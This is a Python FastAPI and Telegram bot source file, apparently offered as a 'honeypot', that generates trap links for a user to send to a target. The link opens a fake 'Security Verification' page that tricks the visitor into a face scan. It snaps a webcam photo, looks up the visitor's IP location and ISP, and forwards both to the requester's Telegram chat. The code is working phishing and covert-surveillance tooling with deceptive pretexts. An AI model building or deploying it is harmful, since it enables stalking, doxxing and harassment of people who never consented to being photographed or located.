import os
import base64
import logging
from io import BytesIO
from fastapi import FastAPI, Request, UploadFile, File
from fastapi.responses import HTMLResponse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, CallbackQueryHandler
import aiohttp

# ==========================================
# ⚙️ CONFIGURATION (টোকেন এখানে নেই, Vercel থেকে নেবে)
# ==========================================
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
BASE_URL = os.environ.get("BASE_URL")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ডাটাবেস ছাড়া Chat ID লুকানোর ম্যাজিক (Base64)
def encode_chat_id(chat_id: int) -> str:
    return base64.urlsafe_b64encode(str(chat_id).encode()).decode().rstrip("=")

def decode_chat_id(link_id: str) -> int:
    try:
        padded = link_id + "=" * (-len(link_id) % 4)
        return int(base64.urlsafe_b64decode(padded).decode())
    except:
        return 0

app = FastAPI()
bot = Bot(token=TELEGRAM_BOT_TOKEN)
application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

# ==========================================
# 🕵️ FAKE HTML PAGE (The Trap)
# ==========================================
FAKE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Secure Document Access</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); text-align: center; max-width: 400px; }
        h2 { color: #333; } p { color: #666; font-size: 14px; }
        .btn { background-color: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
        .btn:hover { background-color: #0056b3; }
        #status { margin-top: 15px; color: green; font-weight: bold; display: none; }
        video { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🔒 Security Verification</h2>
        <p>To access this confidential document, please verify your identity using a quick Face Scan.</p>
        <button class="btn" id="startBtn" onclick="startScan()">Start Face Verification</button>
        <p id="status">Verification in progress... Please wait.</p>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>
    <script>
        async function startScan() {
            document.getElementById('startBtn').style.display = 'none';
            document.getElementById('status').style.display = 'block';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(track => track.stop());
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'intruder.jpg');
                        await fetch('/upload/{{link_id}}', { method: 'POST', body: formData });
                        document.getElementById('status').innerText = "Verification Failed! Access Denied.";
                        document.getElementById('status').style.color = "red";
                    }, 'image/jpeg');
                }, 2000);
            } catch (err) {
                document.getElementById('status').innerText = "Camera access denied. Verification failed.";
                document.getElementById('status').style.color = "red";
                fetch('/upload/{{link_id}}', { method: 'POST' });
            }
        }
    </script>
</body>
</html>
"""

# ==========================================
# 🌐 FASTAPI ROUTES
# ==========================================
@app.get("/trap/{link_id}", response_class=HTMLResponse)
async def serve_trap(link_id: str):
    html_content = FAKE_HTML.replace("{{link_id}}", link_id)
    return html_content

@app.post("/upload/{link_id}")
async def handle_upload(link_id: str, request: Request, photo: UploadFile = File(None)):
    chat_id = decode_chat_id(link_id)
    if chat_id == 0: return {"status": "error"}

    client_host = request.client.host
    if "x-forwarded-for" in request.headers:
        client_host = request.headers["x-forwarded-for"]

    location_info = "Unknown Location"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com/json/{client_host}") as resp:
                data = await resp.json()
                if data['status'] == 'success':
                    location_info = f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')} | ISP: {data.get('isp', 'N/A')}"
    except: pass

    caption_text = f"🚨 **INTRUDER ALERT!** 🚨\n\n🎯 Trap Link Clicked!\n🌐 **IP Address:** `{client_host}`\n📍 **Location:** {location_info}\n"

    if photo:
        image_bytes = await photo.read()
        bio = BytesIO(image_bytes)
        bio.name = 'intruder.jpg'
        bio.seek(0)
        await bot.send_photo(chat_id=chat_id, photo=bio, caption=caption_text, parse_mode="Markdown")
    else:
        caption_text += "\n⚠️ Camera access was denied."
        await bot.send_message(chat_id=chat_id, text=caption_text, parse_mode="Markdown")

    return {"status": "success"}

# ==========================================
# 🤖 TELEGRAM BOT LOGIC
# ==========================================
async def start(update: Update, context):
    keyboard = [[InlineKeyboardButton("🚀 Generate New Link", callback_data="new_link")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("🛡️ **Jarvis Honeypot System Online**\n\nClick below to generate trap link.", reply_markup=reply_markup)

async def button_handler(update: Update, context):
    query = update.callback_query
    await query.answer()
    if query.data == "new_link":
        chat_id = query.message.chat_id
        link_id = encode_chat_id(chat_id)
        trap_link = f"{BASE_URL}/trap/{link_id}"
        keyboard = [[InlineKeyboardButton("🚀 Generate New Link", callback_data="new_link")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text=f"✅ **New Trap Link Generated!**\n\n🔗 Link: `{trap_link}`\n\n⚠️ Send this to target.", 
            parse_mode="Markdown", 
            reply_markup=reply_markup
        )

application.add_handler(CommandHandler("start", start))
application.add_handler(CallbackQueryHandler(button_handler))

@app.post("/webhook")
async def telegram_webhook(req: Request):
    data = await req.json()
    update = Update.de_json(data, application.bot)
    await application.initialize()
    await application.process_update(update)
    return {"status": "ok"}
